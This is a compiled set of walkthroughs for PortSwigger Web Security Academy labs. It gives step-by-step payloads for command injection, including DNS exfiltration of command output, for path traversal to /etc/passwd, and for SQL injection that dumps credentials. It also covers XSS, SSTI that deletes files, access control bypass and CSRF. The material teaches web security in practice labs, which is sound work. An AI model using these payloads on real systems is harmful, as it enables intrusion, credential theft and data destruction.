# Table of Contents

- [OS Command Injection](#OS-Command-Injection)
- [Information disclosure](#Information-disclosure)
- [Directory Traversal](#Directory-Traversal)
- [SQL Injection](#SQL-Injection)
- [Cross-site scripting](#XSS)
- [Server side template injection](#SSTI)
- [Business logic vulnerabilities](#Business-logic-vulnerabilities)
- [Access control vulnerabilities](#Access-control-vulnerabilities)

# OS Command Injection

## OS command injection, simple case
1. Use Burp Suite to intercept and modify a request that checks the stock level.
2. Modify the storeID parameter, giving it the value 1|whoami.
3. Observe that the response contains the name of the current user.

## Blind OS command injection with time delays
1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the email parameter, changing it to:
    `email=x||ping+-c+10+127.0.0.1||`
3. Observe that the response takes 10 seconds to return.

## Blind OS command injection with output redirection
1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the email parameter, changing it to:
    `email=||whoami>/var/www/images/output.txt||`
3. Now use Burp Suite to intercept and modify the request that loads an image of a product.
4. Modify the filename parameter, changing the value to the name of the file you specified for the output of the injected command:
    `filename=output.txt`
5. Observe that the response contains the output from the injected command.

## Blind OS command injection with out-of-band interaction
1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the email parameter, changing it to:
    `email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`

## Blind OS command injection with out-of-band data exfiltration
1. Use Burp Suite Professional to intercept and modify the request that submits feedback.
2. Go to the Burp menu, and launch the Burp Collaborator client.
3. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
4. Modify the email parameter, changing it to something like the following, but insert your Burp Collaborator subdomain where indicated:
    `email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||`
5. Go back to the Burp Collaborator client window, and click "Poll now". You should see some DNS interactions that were initiated by the application as the result of your payload. If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously.
6. Observe that the output from your command appears in the subdomain of the interaction, and you can view this within the Burp Collaborator client. The full domain name that was looked up is shown in the Description tab for the interaction.
7. To complete the lab, enter the name of the current user.

# Information disclosure

## Information disclosure in error messages
1. With Burp running, open one of the product pages.
2. In Burp, go to "Proxy" > "HTTP history" and notice that the GET request for product pages contains a productID parameter. Send the GET /product?productId=1 request to Burp Repeater. Note that your productId might be different depending on which product page you loaded.
3. In Burp Repeater, change the value of the productId parameter to a non-integer data type, such as a string. Send the request:
    `GET /product?productId="example"`
4. The unexpected data type causes an exception, and a full stack trace is displayed in the response. This reveals that the lab is using Apache Struts 2 2.3.31.
5. Go back to the lab, click "Submit solution", and enter 2 2.3.31 to solve the lab.

## Information disclosure on debug page
1. With Burp running, browse to the home page.
2. Go to the "Target" > "Site Map" tab. Right-click on the top-level entry for the lab and select "Engagement tools" > "Find comments". Notice that the home page contains an HTML comment that contains a link called "Debug". This points to /cgi-bin/phpinfo.php.
3. In the site map, right-click on the entry for /cgi-bin/phpinfo.php and select "Send to Repeater".
4. In Burp Repeater, send the request to retrieve the file. Notice that it reveals various debugging information, including the SECRET_KEY environment variable.
5. Go back to the lab, click "Submit solution", and enter the SECRET_KEY to solve the lab.

## Source code disclosure via backup files
1. Browse to /robots.txt and notice that it reveals the existence of a /backup directory. Browse to /backup to find the file ProductTemplate.java.bak. Alternatively, right-click on the lab in the site map and go to "Engagement tools" > "Discover content". Then, launch a content discovery session to discover the /backup directory and its contents.
2. Browse to /backup/ProductTemplate.java.bak to access the source code.
3. In the source code, notice that the connection builder contains the hard-coded password for a Postgres database.
4. Go back to the lab, click "Submit solution", and enter the database password to solve the lab.

## Authentication bypass via information disclosure
1. In Burp Repeater, browse to GET /admin. The response discloses that the admin panel is only accessible if logged in as an administrator, or if requested from a local IP.
2. Send the request again, but this time use the TRACE method:
    `TRACE /admin`
3. Study the response. Notice that the X-Custom-IP-Authorization header, containing your IP address, was automatically appended to your request. This is used to determine whether or not the request came from the localhost IP address.
4. Go to "Proxy" > "Options", scroll down to the "Match and Replace" section, and click "Add". Leave the match condition blank, but in the "Replace" field, enter:
    `X-Custom-IP-Authorization: 127.0.0.1`
    Burp Proxy will now add this header to every request you send.
5. Browse to the home page. Notice that you now have access to the admin panel, where you can delete Carlos.

## Information disclosure in version control history
1. Open the lab and browse to /.git to reveal the lab's Git version control data.
2. Download a copy of this entire directory. For Linux users, the easiest way to do this is using the command:
    `wget -r https://your-lab-id.web-security-academy.net/.git/`

    Windows users will need to find an alternative method, or install a UNIX-like environment, such as Cygwin, in order to use this command.
3. Explore the downloaded directory using your local Git installation. Notice that there is a commit with the message "Remove admin password from config".
4. Look closer at the diff for the changed admin.conf file. Notice that the commit replaced the hard-coded admin password with an environment variable ADMIN_PASSWORD instead. However, the hard-coded password is still clearly visible in the diff.
5. Go back to the lab and log in to the administrator account using the leaked password.
6. To solve the lab, open the admin interface and delete Carlos's account.

## Directory Traversal

## File path traversal, simple case
1. Use Burp Suite to intercept and modify a request that fetches a product image.
2. Modify the filename parameter, giving it the value:

    `../../../etc/passwd`
3.Observe that the response contains the contents of the /etc/passwd file.

## File path traversal, traversal sequences blocked with absolute path bypass
1. Use Burp Suite to intercept and modify a request that fetches a product image.
2. Modify the filename parameter, giving it the value /etc/passwd.
3. Observe that the response contains the contents of the /etc/passwd file.

## File path traversal, traversal sequences stripped non-recursively
1. Use Burp Suite to intercept and modify a request that fetches a product image.
2. Modify the filename parameter, giving it the value:

    `....//....//....//etc/passwd`
3. Observe that the response contains the contents of the /etc/passwd file.

## File path traversal, traversal sequences stripped with superfluous URL-decode
1. Use Burp Suite to intercept and modify a request that fetches a product image.
2. Modify the filename parameter, giving it the value:

    `..%252f..%252f..%252fetc/passwd`
3. Observe that the response contains the contents of the /etc/passwd file.

## File path traversal, validation of start of path
1. Use Burp Suite to intercept and modify a request that fetches a product image.
2. Modify the filename parameter, giving it the value:

    `/var/www/images/../../../etc/passwd`
3. Observe that the response contains the contents of the /etc/passwd file.

## File path traversal, validation of file extension with null byte bypass
1. Use Burp Suite to intercept and modify a request that fetches a product image.
2. Modify the filename parameter, giving it the value:

    `../../../etc/passwd%00.png`
3. Observe that the response contains the contents of the /etc/passwd file.

# SQL Injection

## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

1. Use Burp Suite to intercept the request. Main purpose of this method is we can modify the request to attack the website using our own payload using burp.
2. Modify the category parameter, giving it the value '+OR+1=1--
3. Submit the request, and verify that the response now contains additional items.

## SQL injection vulnerability allowing login bypass

1. Use Burp Suite to intercept the request. Main purpose of this method is we can modify the request to attack the website using our own payload using burp.
2. Modify the username parameter, giving it the value: administrator'--

## SQLI UNION ATTACKS

## SQL injection UNION attack, determining the number of columns returned by the query

1. Use Burp Suite to intercept the request. Main purpose of this method is we can modify the request to attack the website using our own payload using burp.
2. Modify the category parameter, giving it the value '+UNION+SELECT+NULL--. Observe that an error occurs.
3. Modify the category parameter to add an additional column containing a null value:

`'+UNION+SELECT+NULL,NULL--`
4. Continue adding null values until the error disappears and the response includes additional content containing the null values.

## SQL injection UNION attack, finding a column containing text

1. Use Burp Suite to intercept the request. Main purpose of this method is we can modify the request to attack the website using our own payload using burp.
2.Determine the number of columns that are being returned by the query. Verify that the query is returning three columns, using the following payload in the category parameter:

`'+UNION+SELECT+NULL,NULL,NULL--`
3.Try replacing each null with the random value provided by the lab, for example:

'+UNION+SELECT+'abcdef',NULL,NULL--
4. If an error occurs, move on to the next null and try that instead.

## SQL injection UNION attack, retrieving data from other tables

1. Use Burp Suite to intercept the request. Main purpose of this method is we can modify the request to attack the website using our own payload using burp.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:

`'+UNION+SELECT+'abc','def'--`
3. Use the following payload to retrieve the contents of the users table:

`'+UNION+SELECT+username,+password+FROM+users--`
4. Verify that the application's response contains usernames and passwords.

## SQL injection UNION attack, retrieving multiple values in a single column

1. Use Burp Suite to intercept the request. Main purpose of this method is we can modify the request to attack the website using our own payload using burp.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, only one of which contain text, using a payload like the following in the category parameter:

`'+UNION+SELECT+NULL,'abc'--`
3. Use the following payload to retrieve the contents of the users table:

'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
4. Verify that the application's response contains usernames and passwords.

## EXAMINING THE DATABASE

https://portswigger.net/web-security/sql-injection/cheat-sheet

## SQL injection attack, querying the database type and version on Oracle

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:

`'+UNION+SELECT+'abc','def'+FROM+dual--`
3. Use the following payload to display the database version:

`'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`

## SQL injection attack, querying the database type and version on MySQL and Microsoft

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:

`'+UNION+SELECT+'abc','def'#`
3. Use the following payload to display the database version:

`'+UNION+SELECT+@@version,+NULL#`

## SQL injection attack, listing the database contents on non-Oracle databases

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:

`'+UNION+SELECT+'abc','def'--`
3. Use the following payload to retrieve the list of tables in the database:

`'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
4. Find the name of the table containing user credentials.
5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table:

`'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--`

6. Find the names of the columns containing usernames and passwords.
7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:

`'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--`

8. Find the password for the administrator user, and use it to log in.

## SQL injection attack, listing the database contents on Oracle

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:

`'+UNION+SELECT+'abc','def'+FROM+dual--`
3. Use the following payload to retrieve the list of tables in the database:

`'+UNION+SELECT+table_name,NULL+FROM+all_tables--`
4. Find the name of the table containing user credentials.
5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table:

`'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--`

6. Find the names of the columns containing usernames and passwords.
7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:

`'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--`
8. Find the password for the administrator user, and use it to log in.

## BLIND SQL INJECTION

## Blind SQL injection with conditional responses

1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie. For simplicity, let's say the original value of the cookie is TrackingId=xyz.
2. Modify the TrackingId cookie, changing it to:

`TrackingId=xyz' AND '1'='1`
Verify that the "Welcome back" message appears in the response.

3. Now change it to:

`TrackingId=xyz' AND '1'='2`
Verify that the "Welcome back" message does not appear in the response. This demonstrates how you can test a single boolean condition and infer the result.

4. Now change it to:

`TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a`
Verify that the condition is true, confirming that there is a table called users.

5. Now change it to:

`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
Verify that the condition is true, confirming that there is a user called administrator.

6. The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to:

`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`
This condition should be true, confirming that the password is greater than 1 character in length.

7. Send a series of follow-up values to test different password lengths. Send:

`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a`
Then send:

`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a`
And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the "Welcome back" message disappears), you have determined the length of the password, which is in fact 20 characters long.

8. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.
9. In the Positions tab of Burp Intruder, clear the default payload positions by clicking the "Clear §" button.
10. In the Positions tab, change the value of the cookie to:

`TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`
This uses the SUBSTRING() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.

11. Place payload position markers around the final a character in the cookie value. To do this, select just the a, and click the "Add §" button. You should then see the following as the cookie value (note the payload position markers):

`TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`

12. To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. Go to the Payloads tab, check that "Simple list" is selected, and under "Payload Options" add the payloads in the range a - z and 0 - 9. You can select these easily using the "Add from list" drop-down.
13. To be able to tell when the correct character was submitted, you'll need to grep each response for the expression "Welcome back". To do this, go to the Options tab, and the "Grep - Match" section. Clear any existing entries in the list, and then add the value "Welcome back".
14. Launch the attack by clicking the "Start attack" button or selecting "Start attack" from the Intruder menu.
15. Review the attack results to find the value of the character at the first position. You should see a column in the results called "Welcome back". One of the rows should have a tick in this column. The payload showing for that row is the value of the character at the first position.
16. Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the main Burp window, and the Positions tab of Burp Intruder, and change the specified offset from 1 to 2. You should then see the following as the cookie value:

TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
17. Launch the modified attack, review the results, and note the character at the second offset.
18. Continue this process testing offset 3, 4, and so on, until you have the whole password.
19. In the browser, click "My account" to open the login page. Use the password to log in as the administrator user.

# XSS 

## REFLECTED XSS

## Reflected XSS into HTML context with nothing encoded

1. Put this script in the search box:

`<script>alert(1)</script>`

## Graphic solution available in module on Reflected XSS.

## STORED XSS

## Stored XSS into HTML context with nothing encoded

1. Enter the following into the comment box:

`<script>alert(1)</script>`
2. Enter a name, email and website.
3. Click "Post comment".
4. Go back to the blog.

## Graphic solution available in module on Reflected XSS.

## DOM-BASED XSS

## DOM XSS in document.write sink using source location.search

1. Enter a random alphanumeric string into the search box.
2. Right-click and inspect the element, and observe that your random string has been placed inside an img src attribute.
3. Break out of the img attribute by searching for:

  `"><svg onload=alert(1)>`

## DOM XSS in document.write sink using source location.search inside a select element

1. On the product pages, notice that the dangerous JavaScript extracts a storeId parameter from the location.search source. It then uses document.write to create a new option in the select element for the stock checker functionality.
2. Add a storeId query parameter to the URL and enter a random alphanumeric string as its value. Request this modified URL.
3. In the browser, notice that your random string is now listed as one of the options in the drop-down list.
4. Right-click and inspect the drop-down list to confirm that the value of your storeId parameter has been placed inside a select element.
5. Change the URL to include a suitable XSS payload inside the storeId parameter as follows:

  `{product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>}`

## DOM XSS in innerHTML sink using source location.search

1. Enter the following into the into the search box:

 ` <img src=1 onerror=alert(1)>`
2. Click "Search".

The value of the src attribute is invalid and throws an error. This triggers the onerror event handler, which then calls the alert() function. As a result, the payload is executed whenever the user's browser attempts to load the page containing your malicious post.

## DOM XSS in jQuery anchor href attribute sink using location.search source

1. On the Submit feedback page, change the query parameter returnPath to / followed by a random alphanumeric string.
2. Right-click and inspect the element, and observe that your random string has been placed inside an a href attribute.
3. Change returnPath to:

 ` {javascript:alert(document.cookie)}`
Hit enter and click "back".

## DOM XSS in jQuery selector sink using a hashchange event

1. Notice the vulnerable code on the home page using Burp or the browser's DevTools.
2. From the lab banner, open the exploit server.
3. In the Body section, add the following malicious iframe:

  `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`
4. Store the exploit, then click View exploit to confirm that the print() function is called.
5. Go back to the exploit server and click Deliver to victim to solve the lab.

## Reflected DOM XSS

1. In Burp Suite, go to the Proxy tool and make sure that the Intercept feature is switched on.
2. Back in the lab, go to the target website and use the search bar to search for a random test string, such as "XSS".
3. Return to the Proxy tool in Burp Suite and forward the request.
4. On the Intercept tab, notice that the string is reflected in a JSON response called search-results.
5. From the Site Map, open the searchResults.js file and notice that the JSON response is used with an eval() function call.
6. By experimenting with different search strings, you can identify that the JSON response is escaping quotation marks. However, backslash is not being escaped.
7. To solve this lab, enter the following search term:

 ` \"-alert(1)}//`

As you have injected a backslash and the site isn't escaping them, when the JSON response attempts to escape the opening double-quotes character, it adds a second backslash. The resulting double-backslash causes the escaping to be effectively canceled out. This means that the double-quotes are processed unescaped, which closes the string that should contain the search term.

An arithmetic operator (in this case the subtraction operator) is then used to separate the expressions before the alert() function is called. Finally, a closing curly bracket and two forward slashes close the JSON object early and comment out what would have been the rest of the object. As a result, the response is generated as follows:

  `{"searchTerm":"\\"-alert(1)}//", "results":[]}`

## Stored DOM XSS

1. Post a comment containing the following vector:

  `<><img src=1 onerror=alert(1)>`

In an attempt to prevent XSS, the website uses the JavaScript replace() function to encode angle brackets. However, when the first argument is a string, the function only replaces the first occurrence. We exploit this vulnerability by simply including an extra set of angle brackets at the beginning of the comment. These angle brackets will be encoded, but any subsequent angle brackets will be unaffected, enabling us to effectively bypass the filter and inject HTML.

# SSTI

## Basic server-side template injection
1. Notice that when you try to view more details about the first product, a GET request uses the message parameter to render "Unfortunately this product is out of stock" on the home page.
2. In the ERB documentation, discover that the syntax `<%= someExpression %>` is used to evaluate an expression and render the result on the page.
3. Use ERB template syntax to create a test payload containing a mathematical operation, for example:

`<%= 7*7 %>`
4. URL-encode this payload and insert it as the value of the message parameter in the URL as follows, remembering to replace your-lab-id with your own lab ID:

`https://your-lab-id.web-security-academy.net/?message=<%25%3d+7*7+%25>`
5. Load the URL in the browser. Notice that in place of the message, the result of your mathematical operation is rendered on the page, in this case, the number 49. This indicates that we may have a server-side template injection vulnerability.
6. From the Ruby documentation, discover the system() method, which can be used to execute arbitrary operating system commands.
7. Construct a payload to delete Carlos's file as follows:

`<%= system("rm /home/carlos/morale.txt") %>`
8. URL-encode your payload and insert it as the value of the message parameter, remembering to replace your-lab-id with your own lab ID:

`https://your-lab-id.web-security-academy.net/?message=<%25+system("rm+/home/carlos/morale.txt")+%25>`

## Basic server-side template injection (code context)
1. While proxying traffic through Burp, log in and post a comment on one of the blog posts.
2. Notice that on the "My account" page, you can select whether you want the site to use your full name, first name, or nickname. When you submit your choice, a POST request sets the value of the parameter blog-post-author-display to either user.name, user.first_name, or user.nickname. When you load the page containing your comment, the name above your comment is updated based on the current value of this parameter.
3. In Burp, go to "Proxy" > "HTTP history" and find the request that sets this parameter, namely POST /my-account/change-blog-post-author-display, and send it to Burp Repeater.
4. Study the Tornado documentation to discover that template expressions are surrounded with double curly braces, such as {{someExpression}}. In Burp Repeater, notice that you can escape out of the expression and inject arbitrary template syntax as follows:

blog-post-author-display=user.name}}{{7*7}}
5. Reload the page containing your test comment. Notice that the username now says Peter Wiener49}}, indicating that a server-side template injection vulnerability may exist in the code context.
6. In the Tornado documentation, identify the syntax for executing arbitrary Python:

`{% somePython %}`
7. Study the Python documentation to discover that by importing the os module, you can use the system() method to execute arbitrary system commands.
8. Combine this knowledge to construct a payload that deletes Carlos's file:

`{% import os %}`
`{{os.system('rm /home/carlos/morale.txt')`
9. In Burp Repeater, go back to POST /my-account/change-blog-post-author-display. Break out of the expression, and inject your payload into the parameter, remembering to URL-encode it as follows:

`blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')`

10. Reload the page containing your comment to execute the template and solve the lab.

# Business logic vulnerabilities

## Excessive trust in client-side controls
1. With Burp running, log in and attempt to buy the leather jacket. The order is rejected because you don't have enough store credit.
2. In Burp, go to "Proxy" > "HTTP history" and study the order process. Notice that when you add an item to your cart, the corresponding request contains a price parameter. Send the POST /cart request to Burp Repeater.
3. In Burp Repeater, change the price to an arbitrary integer and send the request. Refresh the cart and confirm that the price has changed based on your input.
4. Repeat this process to set the price to any amount less than your available store credit.
5. Complete the order to solve the lab.

## High-level logic vulnerability
1. With Burp running, log in and add a cheap item to your cart.
2. In Burp, go to "Proxy" > "HTTP history" and study the corresponding HTTP messages. Notice that the quantity is determined by a parameter in the POST /cart request.
3. Go to the "Intercept" tab and turn on interception. Add another item to your cart and go to the intercepted POST /cart request in Burp.
4. Change the quantity parameter to an arbitrary integer, then forward any remaining requests. Observe that the quantity in the cart was successfully updated based on your input.
5. Repeat this process, but request a negative quantity this time. Check that this is successfully deducted from the cart quantity.
6.  a suitable negative quantity to remove more units from the cart than it currently contains. Confirm that you have successfully forced the cart to contain a negative quantity of the product. Go to your cart and notice that the total price is now also a negative amount.
7. Add the leather jacket to your cart as normal. Add a suitable negative quantity of the another item to reduce the total price to less than your remaining store credit.
8. Place the order to solve the lab.

## Inconsistent security controls
1. Open the lab then go to the "Target" > "Site map" tab in Burp. Right-click on the lab domain and select "Engagement tools" > "Discover content" to open the content discovery tool.
2. Click "Session is not running" to start the content discovery. After a short while, look at the "Site map" tab in the dialog. Notice that it discovered the path /admin.
3. Try and browse to /admin. Although you don't have access, the error message indicates that DontWannaCry users do.
4. Go to the account registration page. Notice the message telling DontWannaCry employees to use their company email address. Register with an arbitrary email address in the format:

`anything@your-email-id.web-security-academy.net`
5. You can find your email domain name by clicking the "Email client" button.

6. Go to the email client and click the link in the confirmation email to complete the registration.
7. Log in using your new account and go to the "My account" page. Notice that you have the option to change your email address. Change your email address to an arbitrary @dontwannacry.com address.
8. Notice that you now have access to the admin panel, where you can delete Carlos to solve the lab.

## Flawed enforcement of business rules
1. Log in and notice that there is a coupon code, NEWCUST5.
2. At the bottom of the page, sign up to the newsletter. You receive another coupon code, SIGNUP30.
3. Add the leather jacket to your cart.
4. Go to the checkout and apply both of the coupon codes to get a discount on your order.
5. Try applying the codes more than once. Notice that if you enter the same code twice in a row, it is rejected because the coupon has already been applied. 6. However, if you alternate between the two codes, you can bypass this control.
7. Reuse the two codes enough times to reduce your order total to less than your remaining store credit. Complete the order to solve the lab.

# Access control vulnerabilities

## [Unprotected admin functionality](https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality)
1. Go to the lab and view robots.txt by appending /robots.txt to the lab URL. Notice that the Disallow line discloses the path to the admin panel.
2. In the URL bar, replace /robots.txt with /administrator-panel to load the admin panel.
3. Delete carlos.

## [Unprotected admin functionality with unpredictable URL](https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality-with-unpredictable-url)
1. Review the lab home page's source using Burp Suite or your web browser's developer tools.
2. Observe that it contains some JavaScript that discloses the URL of the admin panel.
3. Load the admin panel and delete carlos.

## [User role controlled by request parameter](https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter)
1. Browse to /admin and observe that you can't access the admin panel.
2. Browse to the login page.
3. In Burp Proxy, turn interception on and enable response interception.
4. Complete and submit the login page, and forward the resulting request in Burp.
5. Observe that the response sets the cookie Admin=false. Change it to Admin=true.
6. Load the admin panel and delete carlos.

## User role can be modified in user profile
1. Log in using the supplied credentials and access your account page.
2. Use the provided feature to update the email address associated with your account.
3. Observe that the response contains your role ID.
4. Send the email submission request to Burp Repeater, add "roleid":2 into the JSON in the request body, and resend it.
5. Observe that the response shows your roleid has changed to 2.
6. Browse to /admin and delete carlos.

## [User ID controlled by request parameter](https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter)
1. Log in using the supplied credentials and go to your account page.
2. Note that the URL contains your username in the "id" parameter.
3. Send the request to Burp Repeater.
4. Change the "id" parameter to carlos.
5. Retrieve and submit the API key for carlos.

## User ID controlled by request parameter, with unpredictable user IDs
1. Find a blog post by carlos.
2. Click on carlos and observe that the URL contains his user ID. Make a note of this ID.
3. Log in using the supplied credentials and access your account page.
4. Change the "id" parameter to the saved user ID.
5. Retrieve and submit the API key.

## User ID controlled by request parameter with data leakage in redirect
1. Log in using the supplied credentials and access your account page.
2. Send the request to Burp Repeater.
3. Change the "id" parameter to carlos.
4. Observe that although the response is now redirecting you to the home page, it has a body containing the API key belonging to carlos.
5. Submit the API key.

## User ID controlled by request parameter with password disclosure
1. Log in using the supplied credentials and access the user account page.
2. Change the "id" parameter in the URL to administrator.
3. View the response in Burp and observe that it contains the administrator's password.
4. Log in to the administrator account and delete carlos.

## Insecure direct object references
1. Select the Live chat tab.
2. Send a message and then select View transcript.
3. Review the URL and observe that the transcripts are text files assigned a filename containing an incrementing number.
3. Change the filename to 1.txt and review the text. Notice a password within the chat transcript.
4. Return to the main lab page and log in using the stolen credentials.

# CROSS SITE REQUEST FORGERY (CSRF)

## CSRF vulnerability with no defenses

1. Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
2. If you're using Burp Suite Professional, right-click on the request and select Engagement tools / Generate CSRF PoC. Enable the option to include an auto-submit script and click "Regenerate".

Alternatively, if you're using Burp Suite Community Edition, use the following HTML template and fill in the request's method, URL, and body parameters. You can get the request URL by right-clicking and selecting "Copy URL".

`<form method="$method" action="$url">
    <input type="hidden" name="$param1name" value="$param1value">
</form>
<script>
        document.forms[0].submit();
</script>`

3. Go to the exploit server, paste your exploit HTML into the "Body" section, and click "Store".
4. To verify that the exploit works, try it on yourself by clicking "View exploit" and then check the resulting HTTP request and response.
5. Click "Deliver to victim" to solve the lab.

## CSRF where token validation depends on request method

1. Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
2. Send the request to Burp Repeater and observe that if you change the value of the csrf parameter then the request is rejected.
3. Use "Change request method" on the context menu to convert it into a GET request and observe that the CSRF token is no longer verified.
4. If you're using Burp Suite Professional, right-click on the request, and from the context menu select Engagement tools / Generate CSRF PoC. Enable the option to include an auto-submit script and click "Regenerate".

Alternatively, if you're using Burp Suite Community Edition, use the following HTML template and fill in the request's method, URL, and body parameters. You can get the request URL by right-clicking and selecting "Copy URL".

<form method="$method" action="$url">
    <input type="hidden" name="$param1name" value="$param1value">
</form>
<script>
        document.forms[0].submit();
</script>

5. Go to the exploit server, paste your exploit HTML into the "Body" section, and click "Store".
6. To verify if the exploit will work, try it on yourself by clicking "View exploit" and checking the resulting HTTP request and response.
7. Click "Deliver to victim" to solve the lab.

## CSRF where token validation depends on token being present

1. Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
2. Send the request to Burp Repeater and observe that if you change the value of the csrf parameter then the request is rejected.
3. Delete the csrf parameter entirely and observe that the request is now accepted.
4. If you're using Burp Suite Professional, right-click on the request, and from the context menu select Engagement tools / Generate CSRF PoC. Enable the option to include an auto-submit script and click "Regenerate".

Alternatively, if you're using Burp Suite Community Edition, use the following HTML template and fill in the request's method, URL, and body parameters. You can get the request URL by right-clicking and selecting "Copy URL".

`<form method="$method" action="$url">
    <input type="hidden" name="$param1name" value="$param1value">
</form>
<script>
    document.forms[0].submit();
</script>`

5. Go to the exploit server, paste your exploit HTML into the "Body" section, and click "Store".
6. To verify if the exploit will work, try it on yourself by clicking "View exploit" and checking the resulting HTTP request and response.
7. Click "Deliver to victim" to solve the lab.

## CSRF where token is not tied to user session

1. Open Burp's browser and log in to your account. Submit the "Update email" form, and intercept the resulting request.
2. Make a note of the value of the CSRF token, then drop the request.
3. Open a private/incognito browser window, log in to your other account, and send the update email request into Burp Repeater.
4. Observe that if you swap the CSRF token with the value from the other account, then the request is accepted.
5. Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab. Note that the CSRF tokens are single-use, so you'll need to include a fresh one.
6. Store the exploit, then click "Deliver to victim" to solve the lab.

## CSRF where token is tied to non-session cookie

1. Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
2. Send the request to Burp Repeater and observe that changing the session cookie logs you out, but changing the csrfKey cookie merely results in the CSRF token being rejected. This suggests that the csrfKey cookie may not be strictly tied to the session.
3. Open a private/incognito browser window, log in to your other account, and send a fresh update email request into Burp Repeater.
4. Observe that if you swap the csrfKey cookie and csrf parameter from the first account to the second account, the request is accepted.
5. Close the Repeater tab and incognito browser.
6. Back in the original browser, perform a search, send the resulting request to Burp Repeater, and observe that the search term gets reflected in the Set-Cookie header. Since the search function has no CSRF protection, you can use this to inject cookies into the victim user's browser.
7. Create a URL that uses this vulnerability to inject your csrfKey cookie into the victim's browser:

`/?search=test%0d%0aSet-Cookie:%20csrfKey=your-key`
8. Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab, ensuring that you include your CSRF token. The exploit should be created from the email change request.
9. Remove the script block, and instead add the following code to inject the cookie:

`<img src="$cookie-injection-url" onerror="document.forms[0].submit()">`

10. Store the exploit, then click "Deliver to victim" to solve the lab.

## CSRF where token is duplicated in cookie

1. Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
2. Send the request to Burp Repeater and observe that the value of the csrf body parameter is simply being validated by comparing it with the csrf cookie.
3. Perform a search, send the resulting request to Burp Repeater, and observe that the search term gets reflected in the Set-Cookie header. Since the search function has no CSRF protection, you can use this to inject cookies into the victim user's browser.
4. Create a URL that uses this vulnerability to inject a fake csrf cookie into the victim's browser:

`/?search=test%0d%0aSet-Cookie:%20csrf=fake`

5. Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab, ensuring that your CSRF token is set to "fake". The exploit should be created from the email change request.
6. Remove the script block, and instead add the following code to inject the cookie and submit the form:

`<img src="$cookie-injection-url" onerror="document.forms[0].submit();"/>`

7. Store the exploit, then click "Deliver to victim" to solve the lab.

